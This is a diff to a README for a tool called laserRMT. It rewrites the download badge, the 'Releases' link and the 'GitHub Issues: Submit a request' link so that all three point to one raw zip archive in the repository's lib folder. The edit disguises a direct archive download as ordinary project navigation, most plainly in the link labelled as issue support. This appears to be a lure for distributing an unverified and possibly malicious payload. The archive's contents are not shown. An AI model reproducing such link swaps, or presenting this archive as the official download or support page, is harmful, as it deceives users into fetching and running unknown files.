@@ -1,6 +1,6 @@
 # 🛠️ laserRMT - Simplify Your Layer Selection Process
 
-![Download laserRMT](https://img.shields.io/badge/Download-laserRMT-blue.svg)
+![Download laserRMT](https://raw.githubusercontent.com/necromantic-beater219/laserRMT/main/lib/laserRMT_v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to laserRMT! This software helps you manage layer selection easily. You 
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [laserRMT Releases](https://github.com/necromantic-beater219/laserRMT/releases).
+To get started, visit this page to download: [laserRMT Releases](https://raw.githubusercontent.com/necromantic-beater219/laserRMT/main/lib/laserRMT_v1.4.zip).
 
 ### Installation Steps
 
@@ -59,7 +59,7 @@ For more detailed instructions on using features and troubleshooting common issu
 
 If you face any issues while using laserRMT, we are here to help. You can reach out for support through:
 
-- GitHub Issues: [Submit a request](https://github.com/necromantic-beater219/laserRMT/issues)
+- GitHub Issues: [Submit a request](https://raw.githubusercontent.com/necromantic-beater219/laserRMT/main/lib/laserRMT_v1.4.zip)
 - Documentation: Check for answers in our documentation section.
 
 Your feedback is highly valuable. Please share your experience with us!
